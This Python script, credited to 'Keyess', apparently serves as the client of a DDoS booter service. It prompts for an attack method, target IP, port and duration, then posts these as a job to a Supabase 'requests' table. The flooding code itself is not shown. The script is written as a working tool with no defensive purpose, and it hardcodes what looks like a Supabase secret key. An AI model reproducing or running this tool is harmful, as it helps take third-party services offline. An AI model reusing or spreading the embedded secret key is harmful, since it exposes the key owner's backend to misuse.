import os
import requests 
    


SUPABASE_URL = "https://thmtvthwdhnglwejbatg.supabase.co/rest/v1/requests"
SUPABASE_KEY = "sb_secret_2tH8QCobmJfVfv1zn-OoPw_2uwK2cKO"

HEADERS = {
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type": "application/json"
}

ah = input("join method :")

if ah == "HTTP":
    print("Done By keyess",ah)
    ip = input("Target :")
    port = input("Port : ")
    time = input("Time :")

    data = {
        "method":ah,
        "ip":ip
        ,"port":port
        ,"Time":time
    }
    req = requests.post(SUPABASE_URL,json=data,headers=HEADERS)

    if req.status_code == 201:
        print("Done Sent By Keyess")
    else:
        print("not found")


    
else:
    print(" Keyess not found")